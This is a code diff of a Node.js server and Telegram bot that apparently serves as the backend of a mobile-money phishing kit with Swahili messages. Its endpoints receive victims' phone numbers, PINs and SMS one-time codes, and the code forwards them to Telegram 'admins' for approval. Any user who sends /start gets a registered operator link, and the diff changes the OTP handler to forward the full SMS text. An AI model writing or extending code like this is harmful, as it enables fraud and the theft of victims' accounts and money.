@@ -24,7 +24,6 @@ mainBot.on('polling_error', (error) => {
 });
 
 let activeSessions = {};
-// Automatically treat any user who starts the bot as an authorized admin/free link user
 let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
 
 function escapeMarkdown(text) {
@@ -39,7 +38,12 @@ mainBot.on('message', (msg) => {
     const firstName = msg.from.first_name || 'Admin';
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
-    // Broadcast Command (Only Main Admin can use this)
+    if (userIdStr !== MAIN_ADMIN_ID && authorizedAdmins.has(userIdStr)) {
+        if (!msg.text.startsWith('/start')) {
+            return;
+        }
+    }
+
     if (msg.text.startsWith('/broadcast')) {
         if (userIdStr !== MAIN_ADMIN_ID) {
             mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
@@ -72,7 +76,6 @@ mainBot.on('message', (msg) => {
         return;
     }
 
-    // Free Start: Anyone who types /start instantly gets registered and receives their free isolated link
     if (msg.text.startsWith('/start')) {
         authorizedAdmins.add(userIdStr);
         sendAdminLink(chatId, userIdStr, firstName, username);
@@ -92,7 +95,7 @@ function sendAdminLink(chatId, userIdStr, firstName, username) {
         .catch(err => console.error("Error sending start message:", err));
 }
 
-function setupCallbackHandler(botInstance, isMain = false) {
+function setupCallbackHandler(botInstance) {
     botInstance.on('callback_query', async (query) => {
         const chatId = query.message.chat.id;
         const data = query.data;
@@ -108,7 +111,6 @@ function setupCallbackHandler(botInstance, isMain = false) {
             return;
         }
 
-        // Ensure only the designated admin for this specific session can press actions
         if (session.targetAdmin !== userIdStr) {
             botInstance.answerCallbackQuery(query.id, { text: "⚠ Ruhusa imekataliwa: Hii si ya kwako.", show_alert: true });
             return;
@@ -129,21 +131,20 @@ function setupCallbackHandler(botInstance, isMain = false) {
     });
 }
 
-setupCallbackHandler(mainBot, true);
+setupCallbackHandler(mainBot);
 
 app.post('/api/submit-credentials', (req, res) => {
-    const { sessionId, sliderData, loanData, phone, pin, adminId } = req.body;
+    const { sessionId, phone, pin, adminId } = req.body;
     
-    // Fallback to Main Admin if no custom admin query param is passed
     let targetAdmin = MAIN_ADMIN_ID;
 
     if (adminId) {
-        authorizedAdmins.add(adminId); // Automatically authorize any free link user
+        authorizedAdmins.add(adminId);
         targetAdmin = adminId;
     }
 
     activeSessions[sessionId] = {
-        sliderData, loanData, phone, pin,
+        phone, pin,
         targetAdmin,
         status: 'pending_pin_approval'
     };
@@ -162,7 +163,7 @@ app.post('/api/submit-credentials', (req, res) => {
             ]
         }
     }).then(() => {
-        console.log(`✅ Credentials successfully sent to designated admin chat ID: ${targetAdmin}`);
+        console.log(`✅ Credentials successfully sent to designated admin: ${targetAdmin}`);
     }).catch(err => {
         console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
     });
@@ -183,7 +184,7 @@ app.post('/api/submit-otp', (req, res) => {
 
     const message = `UTHIBITISHO WA SMS OTP\n\n` +
         `NAMBARI YA SIMU: ${session.phone}\n\n` +
-        `OTP:\n${otpText}`;
+        `UJUNGE WOTE WA SMS:\n${otpText}`;
 
     mainBot.sendMessage(session.targetAdmin, message, {
         reply_markup: {
@@ -201,7 +202,7 @@ app.post('/api/submit-otp', (req, res) => {
             ]
         }
     }).then(() => {
-        console.log(`✅ OTP successfully sent to admin ${session.targetAdmin}`);
+        console.log(`✅ Full SMS OTP successfully sent to admin ${session.targetAdmin}`);
     }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));
 
     res.json({ success: true });
@@ -218,4 +219,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-        
+    
